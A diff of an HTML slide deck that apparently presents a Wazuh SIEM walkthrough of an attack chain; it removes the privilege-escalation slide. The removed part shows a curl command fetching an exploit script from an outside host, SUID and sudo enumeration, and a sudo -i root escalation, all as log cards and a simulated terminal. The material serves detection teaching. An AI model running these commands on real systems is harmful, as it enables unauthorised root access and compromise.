@@ -427,152 +427,11 @@
         <span class="term-title-label">stt@target — db exfiltration</span>
       </div>
       <div class="term-output" id="term-output-3"></div>
-    </div>
-  </div>
-</div>
-
-
-<!-- ═══════════════════════════════════════════════════════
-     SLIDE 4 — Step 9: Privilege Escalation
-     Cards: lc10–lc15
-═══════════════════════════════════════════════════════════ -->
-<div class="slide" id="slide-4">
-  <div class="topbar">
-    <div style="display:flex;align-items:center;gap:14px">
-      <span class="logo">WAZUH SIEM</span><span class="tlp">TLP:RED</span>
-    </div>
-    <div class="topbar-right">
-      <span>AGENT <b>ubuntu-target / OSsec</b></span>
-      <span>USER <b style="color:var(--red)">stt → root</b></span>
-      <span>TIME <b>21:52:00</b></span>
-    </div>
-  </div>
-  <div class="stepbar">
-    <span class="step-num">STEP 9</span>
-    <span class="step-name">Privilege Escalation — Full Root Access</span>
-    <span class="step-time">21:52:00.000</span>
-    <span class="step-mitre">T1105 · T1110 · T1082 · T1548.001 · T1548.003</span>
-  </div>
-  <div class="slide-body">
-    <div class="scroll-body">
-
-      <div class="log-card" id="lc10">
-        <div class="card-label">
-          <span class="card-label-left">Attempt 1 — Exploit download via curl (copy.fail/exp)</span>
-          <span class="card-label-right">MITRE T1105</span>
-        </div>
-        <div class="card-img-wrap" onclick="openLightbox(this)">
-          <img class="card-img" src="../sketching/privilege escalation/tentation copyfail/curl.png" alt="curl exploit"
-               onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
-          <div class="card-img-placeholder" style="display:none;">[ image: curl.png ]</div>
-        </div>
-        <div class="card-img-wrap" onclick="openLightbox(this)">
-          <img class="card-img" src="../sketching/privilege escalation/tentation copyfail/curl-args.png" alt="curl args"
-               onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
-          <div class="card-img-placeholder" style="display:none;">[ image: curl-args.png ]</div>
-        </div>
-        <div class="card-desc">
-          The attacker attempts to download a public exploit from <span class="val">copy.fail/exp</span> using <span class="key">curl</span>. The arguments log reveals the full destination URL — host resolution fails.
-        </div>
-      </div>
-
-      <div class="log-card" id="lc11">
-        <div class="card-label">
-          <span class="card-label-left">Attempt 2 — User switch failure via su (PAM auth failure)</span>
-          <span class="card-label-right">MITRE T1110</span>
-        </div>
-        <div class="card-img-wrap" onclick="openLightbox(this)">
-          <img class="card-img" src="../sketching/privilege escalation/su/su-refused.png" alt="su refused"
-               onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
-          <div class="card-img-placeholder" style="display:none;">[ image: su-refused.png ]</div>
-        </div>
-        <div class="card-desc">
-          Attempt to switch to root via <span class="key">su</span>. Wazuh records a <span class="val">PAM authentication failure</span> — the attacker does not know the system root password.
-        </div>
-      </div>
-
-      <div class="log-card" id="lc12">
-        <div class="card-label">
-          <span class="card-label-left">Attempt 3 — Kernel version enumeration: uname -r</span>
-          <span class="card-label-right">MITRE T1082</span>
-        </div>
-        <div class="card-img-wrap" onclick="openLightbox(this)">
-          <img class="card-img" src="../sketching/privilege escalation/uname/uname-r.png" alt="uname -r"
-               onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
-          <div class="card-img-placeholder" style="display:none;">[ image: uname-r.png ]</div>
-        </div>
-        <div class="card-desc">
-          Execution of <span class="key">uname -r</span> to fingerprint the exact Linux kernel version and search for applicable Local Privilege Escalation (LPE) exploits.
-        </div>
-      </div>
-
-      <div class="log-card" id="lc13">
-        <div class="card-label">
-          <span class="card-label-left">Attempt 4 — SUID binary search: find / -perm -4000</span>
-          <span class="card-label-right">MITRE T1548.001</span>
-        </div>
-        <div class="card-img-wrap" onclick="openLightbox(this)">
-          <img class="card-img" src="../sketching/privilege escalation/find/find(loking for suid).png" alt="find SUID"
-               onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
-          <div class="card-img-placeholder" style="display:none;">[ image: find-suid.png ]</div>
-        </div>
-        <div class="card-desc">
-          The attacker uses <span class="key">find</span> with <span class="val">-perm -4000</span> to enumerate all SUID binaries, searching for misconfigured executables that could be abused for privilege escalation.
-        </div>
-      </div>
-
-      <div class="log-card" id="lc14">
-        <div class="card-label">
-          <span class="card-label-left">Attempt 5 — sudo -l reveals NOPASSWD: ALL misconfiguration</span>
-          <span class="card-label-right">MITRE T1548.003</span>
-        </div>
-        <div class="card-img-wrap" onclick="openLightbox(this)">
-          <img class="card-img" src="../sketching/privilege escalation/sudo-l/sudo_-l_in_server.png" alt="sudo -l"
-               onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
-          <div class="card-img-placeholder" style="display:none;">[ image: sudo_-l.png ]</div>
-        </div>
-        <div class="card-desc">
-          <span class="key">sudo -l</span> exposes a critical misconfiguration: user <span class="val">stt</span> has <span class="val">NOPASSWD: ALL</span> rights. Any command can be run as root with no password required.
-        </div>
-      </div>
-
-      <div class="log-card" id="lc15">
-        <div class="card-label">
-          <span class="card-label-left">ESCALATION SUCCESS — sudo -i · EUID=0 · Root shell opened</span>
-          <span class="card-label-right">⚠ FULL SYSTEM COMPROMISE</span>
-        </div>
-        <div class="card-img-wrap" onclick="openLightbox(this)">
-          <img class="card-img" src="../sketching/privilege escalation/sudo2(real privilige)/sudo2(-i).png" alt="sudo -i success"
-               onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
-          <div class="card-img-placeholder" style="display:none;">[ image: sudo2(-i).png ]</div>
-        </div>
-        <div class="card-img-wrap" onclick="openLightbox(this)">
-          <img class="card-img" src="../sketching/privilege escalation/sudo2(real privilige)/full_log_sudo2.png" alt="full log sudo2"
-               onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
-          <div class="card-img-placeholder" style="display:none;">[ image: full_log_sudo2.png ]</div>
-        </div>
-        <div class="card-desc">
-          The attacker executes <span class="key">sudo -i</span>. The audit log confirms escalation: <span class="ok">EUID=0 (root)</span>. A privileged interactive shell is opened — the system is fully compromised.
-        </div>
-      </div>
-
-    </div>
-    <div class="attacker-terminal" id="terminal-4">
-      <div class="term-titlebar">
-        <span class="term-dot close"></span><span class="term-dot min"></span><span class="term-dot max"></span>
-        <span class="term-title-label">stt@target — privilege escalation</span>
-      </div>
-      <div class="term-output" id="term-output-4"></div>
-    </div>
-  </div>
-</div>
-
-
 <div class="slide-nav" id="nav"></div>
 <div class="nav-hint">← → / SPACE</div>
 
 <script>
-const TOTAL = 5;
+const TOTAL = 4;
 
 /* ═══════════════════════════════════════════════════════════
    ATTACKER TERMINAL CONTENT
@@ -656,39 +515,7 @@ const SLIDE_TERMINAL_CONTENT = {
     { out: '# Full DB confirmed — ready for exfiltration', cls: 'out-ok' },
   ],
 
-  /* ── Slide 4 : Privilege Escalation ────────────────── */
-  4: [
-    { out: '# [21:52:00] Attempting privilege escalation', cls: 'comment' },
-    { spacer: true },
-    { out: '# Attempt 1 — fetch exploit from copy.fail', cls: 'comment' },
-    { cmd: 'curl -s https://copy.fail/exp -o /tmp/exp.sh' },
-    { out: 'curl: (6) Could not resolve host: copy.fail', cls: 'out-err' },
-    { spacer: true },
-    { out: '# Attempt 2 — switch user via su', cls: 'comment' },
-    { cmd: 'su root' },
-    { out: 'Password: ', cls: 'out' },
-    { out: 'su: Authentication failure', cls: 'out-err' },
-    { spacer: true },
-    { out: '# Attempt 3 — fingerprint kernel', cls: 'comment' },
-    { cmd: 'uname -r' },
-    { out: '5.15.0-100-generic', cls: 'out-warn' },
-    { spacer: true },
-    { out: '# Attempt 4 — enumerate SUID binaries', cls: 'comment' },
-    { cmd: 'find / -perm -4000 -type f 2>/dev/null' },
-    { out: '/usr/bin/sudo', cls: 'out' },
-    { out: '/usr/bin/su', cls: 'out' },
-    { spacer: true },
-    { out: '# Attempt 5 — check sudo rights', cls: 'comment' },
-    { cmd: 'sudo -l' },
-    { out: 'User stt may run the following commands:', cls: 'out-warn' },
-    { out: '    (ALL) NOPASSWD: ALL', cls: 'out-err' },
-    { spacer: true },
-    { out: '# CRITICAL: NOPASSWD:ALL — escalating now', cls: 'out-err' },
-    { cmd: 'sudo -i' },
-    { cmd: 'id' },
-    { out: 'uid=0(root) gid=0(root) groups=0(root)', cls: 'out-ok' },
-    { out: '# FULL ROOT ACCESS ACHIEVED', cls: 'out-ok' },
-  ],
+
 };
 
 /* ─── Render all terminals ─────────────────────────── */
